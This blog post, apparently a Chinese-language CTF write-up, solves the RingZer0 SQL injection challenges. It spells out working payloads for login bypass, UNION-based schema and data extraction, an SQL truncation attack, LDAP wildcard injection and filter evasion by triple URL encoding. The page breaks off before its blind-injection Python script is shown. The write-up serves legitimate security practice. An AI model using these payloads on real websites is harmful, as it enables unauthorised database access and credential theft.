@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>ringzer0ctf-sql注入 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="sql">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="sql">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ringzer0ctf-sql注入">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/52899/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="sql">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-04-09T13:21:41.429Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ringzer0ctf-sql注入">
+<meta name="twitter:description" content="sql">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ringzer0ctf-sql注入</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Most-basic-SQLi-pattern"><span class="post-toc-number">1.</span> <span class="post-toc-text">Most basic SQLi pattern.</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ACL-rulezzz-the-world"><span class="post-toc-number">2.</span> <span class="post-toc-text">ACL rulezzz the world.</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Login-portal-1"><span class="post-toc-number">3.</span> <span class="post-toc-text">Login portal 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Random-Login-Form"><span class="post-toc-number">4.</span> <span class="post-toc-text">Random Login Form</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Just-another-login-form"><span class="post-toc-number">5.</span> <span class="post-toc-text">Just another login form</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Po-po-po-po-postgresql"><span class="post-toc-number">6.</span> <span class="post-toc-text">Po po po po postgresql</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Don’t-mess-with-Noemie-she-hates-admin"><span class="post-toc-number">7.</span> <span class="post-toc-text">Don’t mess with Noemie; she hates admin!</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#What’s-the-definition-of-NULL"><span class="post-toc-number">8.</span> <span class="post-toc-text">What’s the definition of NULL</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Login-portal-2"><span class="post-toc-number">9.</span> <span class="post-toc-text">Login portal 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Generate-random-quote"><span class="post-toc-number">10.</span> <span class="post-toc-text">Generate random quote</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Thinking-outside-the-box-is-the-key"><span class="post-toc-number">11.</span> <span class="post-toc-text">Thinking outside the box is the key</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#No-more-hacking-for-me"><span class="post-toc-number">12.</span> <span class="post-toc-text">No more hacking for me!</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Don’t-Stumble-in-the-Process"><span class="post-toc-number">13.</span> <span class="post-toc-text">Don’t Stumble in the Process</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Generate-random-quote-again"><span class="post-toc-number">14.</span> <span class="post-toc-text">Generate random quote again</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Login-portal-3"><span class="post-toc-number">15.</span> <span class="post-toc-text">Login portal 3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Lite-login-portal"><span class="post-toc-number">16.</span> <span class="post-toc-text">Lite login portal</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Internet-As-A-Service"><span class="post-toc-number">17.</span> <span class="post-toc-text">Internet As A Service</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Login-portal-4"><span class="post-toc-number">18.</span> <span class="post-toc-text">Login portal 4</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-ringzer0ctf-sql注入"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ringzer0ctf-sql注入</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-09 19:15:00" datetime="2019-04-09T11:15:00.000Z"  itemprop="datePublished">2019-04-09</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/sql/">sql</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">17</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>拿这个平台练手一下SQL注入<a id="more"></a></p>
+<h4 id="Most-basic-SQLi-pattern"><a href="#Most-basic-SQLi-pattern" class="headerlink" title="Most basic SQLi pattern."></a>Most basic SQLi pattern.</h4><p>没有过滤，万能密码直接登录获取flag，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h4 id="ACL-rulezzz-the-world"><a href="#ACL-rulezzz-the-world" class="headerlink" title="ACL rulezzz the world."></a>ACL rulezzz the world.</h4><p>没有过滤，联合查询注入</p>
+<p>注数据库payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select database(),2,3#</span><br></pre></td></tr></table></figure>
+<p>数据库名：<code>chal2</code></p>
+<p>注表payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+<p> 表名：<code>c2_group,c2_group_membership,c2_user</code></p>
+<p>注列payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&apos;c2_group&apos;#</span><br></pre></td></tr></table></figure>
+<p>注内容payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&apos; union select group_concat(id),group_concat(groupname),group_concat(description) from c2_group#</span><br></pre></td></tr></table></figure>
+<p>flag在表<code>c2_group</code>中</p>
+<h4 id="Login-portal-1"><a href="#Login-portal-1" class="headerlink" title="Login portal 1"></a>Login portal 1</h4><p>用户名和密码字段都过滤了注释符<code>#</code>，<code>-</code>，<code>%3B%00</code></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; or &apos;1&amp;password=1</span><br></pre></td></tr></table></figure>
+<h4 id="Random-Login-Form"><a href="#Random-Login-Form" class="headerlink" title="Random Login Form"></a>Random Login Form</h4><p>有注册和登录界面，猜测是SQL约束攻击</p>
+<p>注册payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++1&amp;new_password=123</span><br></pre></td></tr></table></figure>
+<p>登录payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>登录成功获得flag</p>
+<h4 id="Just-another-login-form"><a href="#Just-another-login-form" class="headerlink" title="Just another login form"></a>Just another login form</h4><p>这题LDAP注入，LDAP简单来说类似Mysql，可以理解成一个数据库，具体可以参考<a href="https://www.fujieace.com/jingyan/ldap.html" target="_blank" rel="noopener">https://www.fujieace.com/jingyan/ldap.html</a></p>
+<p>search语法：attribute operator value<br>search filter options:( “&amp;” or “|” (filter1) (filter2) (filter3) …) (“!” (filter))</p>
+<p>=(等于)查找“名“属性为“John”的所有对象，可以使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(givenName=John)</span><br></pre></td></tr></table></figure>
+<p>这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。</p>
+<p>&amp;(逻辑与)如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(givenName=John)(l=Dallas))</span><br></pre></td></tr></table></figure>
+<p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p>
+<p>!(逻辑非)此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!givenName=John）</span><br></pre></td></tr></table></figure>
+<p>此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明</p>
+<p>*（通配符）可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(title=*)</span><br></pre></td></tr></table></figure>
+<p>这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(givenName=Jo*)</span><br></pre></td></tr></table></figure>
+<p>这会返回“名”以“Jo”开头的所有对象。</p>
+<p>高级用法eg:您需要一个筛选条件，用来查找居住在 Dallas 或 Austin，并且名为“John”的所有对象。使用的语法应当是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(givenName=John)(|(l=Dallas)(l=Austin)))</span><br></pre></td></tr></table></figure>
+<p>所以这里LDAP注入主要利用的是通配符<code>*</code></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=*&amp;password=*</span><br></pre></td></tr></table></figure>
+<h4 id="Po-po-po-po-postgresql"><a href="#Po-po-po-po-postgresql" class="headerlink" title="Po po po po postgresql"></a>Po po po po postgresql</h4><p>题目给了提示<strong>postgresql</strong>，经过查询是关系型数据库，<code>--+</code>代表注释</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;--+&amp;password=1</span><br></pre></td></tr></table></figure>
+<p>出现报错信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: syntax error at end of input LINE 1: ...AND password = (&apos;da39a3ee5e6b4b0d3255bfef95601890afd80709&apos;)) ^</span><br></pre></td></tr></table></figure>
+<p>得知需要再添加<code>))</code>闭合</p>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;))--+&amp;password=1</span><br></pre></td></tr></table></figure>
+<h4 id="Don’t-mess-with-Noemie-she-hates-admin"><a href="#Don’t-mess-with-Noemie-she-hates-admin" class="headerlink" title="Don’t mess with Noemie; she hates admin!"></a>Don’t mess with Noemie; she hates admin!</h4><p>题目给出了用户名不是admin，并且同样过滤注释符<code>#</code>和<code>--</code>和<code>/*</code></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; or 1 or &apos;&amp;password=1</span><br></pre></td></tr></table></figure>
+<p>即使admin不存在，但是经过<code>or 1</code>之后最终结果也是1</p>
+<h4 id="What’s-the-definition-of-NULL"><a href="#What’s-the-definition-of-NULL" class="headerlink" title="What’s the definition of NULL"></a>What’s the definition of NULL</h4><p>sqlite注入，以下为sqlite简介：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite的，是一款轻型的数据库。sqlite存在一个叫SQLITE_MASTER的表，这与MySQL5.x的INFORMATION_SCHEMA表类似。sqlite_master 表中保存了数据库中所有表的信息，该表中比较有用的字段有“name,sql”，name字段存放的是表名，sql字段存放的是表结构。可以通过内置函数sqlite_version()获取版本信息，和其他数据库一样，通过“order by”判断长度，该数据库的注释符和ORACLE数据库一样，都是–。</span><br></pre></td></tr></table></figure>
+<p>题目注入点为GET方式传入的参数<code>id</code>，并且传入的值经过base64解密</p>
+<p>题目给出的hint：<code>WHERE (id IS NOT NULL) AND (ID = ? AND display = 1)</code></p>
+<p>猜测后台sql语句为<code>WHERE (id IS NOT NULL) AND (ID = base64_decode($_GET[&#39;id&#39;]) AND display = 1)</code></p>
+<p>获得查询列数payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) order by 3--</span><br></pre></td></tr></table></figure>
+<p>查询列数为3</p>
+<p>获得表名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select group_concat(name),2,3 from sqlite_master--</span><br></pre></td></tr></table></figure>
+<p>表名为：<code>flag</code></p>
+<p>获得表结构payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select group_concat(sql),2,3 from sqlite_master--</span><br></pre></td></tr></table></figure>
+<p>结构：<code>CREATE TABLE flag (content varchar(100), display int(1), id int(10))</code>                </p>
+<p>获得flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select content,2,3 from sqlite_master--</span><br></pre></td></tr></table></figure>
+<h4 id="Login-portal-2"><a href="#Login-portal-2" class="headerlink" title="Login portal 2"></a>Login portal 2</h4><p>同样试一下<code>username=admin&#39;#&amp;password=</code>，返回<code>Wrong username / password.</code>看样子，注释符好像没有被过滤，因为按照前面几关套路，如果过滤提示的是非法字符，那么既然没过滤注释符的话，那就说明用户名<code>admin</code>不存在，那么老套路<code>username=admin&#39; or 1 or &#39;</code>，返回<code>Wrong password for impossibletoguess.</code></p>
+<p>看样子，像是有对我们输入的参数<code>password</code>和查询结果的<code>password</code>进行对比检查，而弹出的<code>impossibletoguess</code>似乎就是用户名字段</p>
+<p>验证一下猜想，试一下<code>username=admin&#39; union select 1,2#</code>，返回<code>Wrong password for 1.</code></p>
+<p>说明第一个字段为用户名字段，既然有回显信息，那么我们就可以很好的利用联合查询</p>
+<p>爆表payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#&amp;password=</span><br></pre></td></tr></table></figure>
+<p>表名：<code>users</code></p>
+<p>爆列payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;#&amp;password=</span><br></pre></td></tr></table></figure>
+<p>列名：<code>username,password</code></p>
+<p>爆用户名<code>impossibletoguess</code>的密码payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(password),2 from users#&amp;password=</span><br></pre></td></tr></table></figure>
+<p>密码：<code>1b2f190ad705d7c2afcac45447a31b053fada0c4</code></p>
+<p>直接输入用户名和密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=impossibletoguess&amp;password=1b2f190ad705d7c2afcac45447a31b053fada0c4</span><br></pre></td></tr></table></figure>
+<p>登录失败，看来密码是经过加密的</p>
+<p>长度为40的密码，看样子不像是md5加密，所以猜测是<strong>sha1</strong>加密</p>
+<p>所以后台对比的可能是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password == sha1($_POST[&apos;password&apos;])</span><br></pre></td></tr></table></figure>
+<p>所以我们只需要通过联合注入，将第二个字段（密码字段）为<code>$_POST[&#39;password&#39;]</code>经过<strong>sha1</strong>加密后的值即可</p>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select 1,sha1(1000)#&amp;password=1000</span><br></pre></td></tr></table></figure>
+<p>这题出的挺有意思的，收获挺大</p>
+<h4 id="Generate-random-quote"><a href="#Generate-random-quote" class="headerlink" title="Generate random quote"></a>Generate random quote</h4><p>注入点为GET方式提交的参数<code>q</code></p>
+<p>测试：<code>?q=1&#39;%23</code>无查询结果，<code>?q=1%23</code>，有查询结果，说明参数<code>q</code>无引号包裹，另外过滤了空格，用<code>/**/</code>代替即可</p>
+<p>爆列数payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=1/**/order/**/by/**/2%23</span><br></pre></td></tr></table></figure>
+<p>列数为2</p>
+<p>爆表名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=1q=0/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>表名：<code>alkdjf4iu,quotes</code></p>
+<p>爆列名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=0/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x616c6b646a66346975%23</span><br></pre></td></tr></table></figure>
+<p>这里<code>table_name</code>字段加上单引号查询不到结果，猜测单引号被转义了，所以转为十六进制</p>
+<p>列名：<code>id,flag</code></p>
+<p>爆flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=0/**/union/**/select/**/1,flag/**/from/**/alkdjf4iu%23</span><br></pre></td></tr></table></figure>
+<h4 id="Thinking-outside-the-box-is-the-key"><a href="#Thinking-outside-the-box-is-the-key" class="headerlink" title="Thinking outside the box is the key"></a>Thinking outside the box is the key</h4><p>测试<code>?id=1&#39;%23</code>和<code>?id=1%23</code>，返回信息<code>SQLite Database error please try again later.</code></p>
+<p>看出这是一个<strong>SQLite</strong>数据库，所以注释符是<code>--</code></p>
+<p>测试<code>?id=1--</code>，正确返回信息，说明参数<code>id</code>无引号包裹</p>
+<p>爆列数payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 order by 2--</span><br></pre></td></tr></table></figure>
+<p>查询列数为2</p>
+<p>爆表名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(name)%20from%20sqlite_master--</span><br></pre></td></tr></table></figure>
+<p>表名：<code>random_stuff,ajklshfajks,troll,aatroll</code></p>
+<p>爆三个表分别的结构payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(sql)%20from%20sqlite_master--</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE random_stuff (id int(10), content varchar(100)),CREATE TABLE ajklshfajks (flag varchar(40)),CREATE TABLE troll (id int(10)),CREATE TABLE aatroll (id int(10))</span><br></pre></td></tr></table></figure>
+<p>发现<code>flag</code>在表<code>ajklshfajks</code>中</p>
+<p>爆flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,flag%20from%20ajklshfajks--</span><br></pre></td></tr></table></figure>
+<h4 id="No-more-hacking-for-me"><a href="#No-more-hacking-for-me" class="headerlink" title="No more hacking for me!"></a>No more hacking for me!</h4><p>题目源代码给出了提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- urldecode(addslashes(str_replace(&quot;&apos;&quot;, &quot;&quot;, urldecode(htmlspecialchars($_GET[&apos;id&apos;], ENT_QUOTES))))) --&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现对<code>$_GET[&#39;id&#39;]</code>进行了两次URL解码，再加上浏览器本身就进行一次解码，所以我们可以对参数<code>id</code>进行URL三次编码，就可以绕过对单引号<code>&#39;</code>的过滤</p>
+<p>爆列数payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1%252527%252520order%252520by%2525203--</span><br><span class="line">plain: 1&apos; order by 3--</span><br></pre></td></tr></table></figure>
+<p>列数为3</p>
+<p>爆表名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528name%252529%25252C3%252520from%252520sqlite_master--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(name),3 from sqlite_master--</span><br></pre></td></tr></table></figure>
+<p>表名：<code>random_data</code></p>
+<p>爆表结构payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528sql%252529%25252C3%252520from%252520sqlite_master--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(sql),3 from sqlite_master--</span><br></pre></td></tr></table></figure>
+<p>结构：<code>CREATE TABLE random_data (id int, message varchar(50), display int)</code></p>
+<p>爆flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528message%252529%25252C3%252520from%252520random_data--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(message),3 from random_data--</span><br></pre></td></tr></table></figure>
+<h4 id="Don’t-Stumble-in-the-Process"><a href="#Don’t-Stumble-in-the-Process" class="headerlink" title="Don’t Stumble in the Process"></a>Don’t Stumble in the Process</h4><p>这题链接到了别的网站，注入点在GET方式传入的参数<code>id</code>，测试发现过滤了关键字<code>union,sleep</code>,并且没有报错信息，测试<code>if</code>未被过滤，所以根据有无返回结果进行基于布尔型的盲注</p>
+<p>py脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 